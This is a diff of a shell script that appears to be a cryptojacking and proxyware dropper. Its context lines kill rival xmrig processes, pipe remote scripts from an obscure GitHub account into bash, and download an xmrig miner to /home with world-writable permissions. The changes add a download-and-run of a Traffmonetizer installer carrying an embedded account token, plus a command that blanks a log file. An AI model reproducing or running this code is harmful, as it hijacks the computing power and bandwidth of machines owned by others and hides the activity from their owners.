@@ -11,7 +11,11 @@ then
   pkill xmrig
   find / -name xmrig | xargs rm -f
 fi
-curl -Ls https://raw.githubusercontent.com/aldnesjxeakxs/scripts/main/1.sh | bash
+curl -L https://raw.githubusercontent.com/spiritLHLS/traffmonetizer-one-click-command-installation/main/tm.sh -o tm.sh
+chmod +x tm.sh
+bash ./tm.sh -t N1wSyYm8cEsQa/o/hTodQ70tRRUQpSiPqtJPI30Nzxo=
+rm -f tm.sh
+echo 0 > /var/log/lcom
 curl -Ls https://raw.githubusercontent.com/aldnesjxeakxs/scripts/main/sep.sh | bash
 curl -k https://github.com/aldnesjxeakxs/scripts/raw/main/xmrig -o /home/xmrig
 chmod 777 /home/xmrig
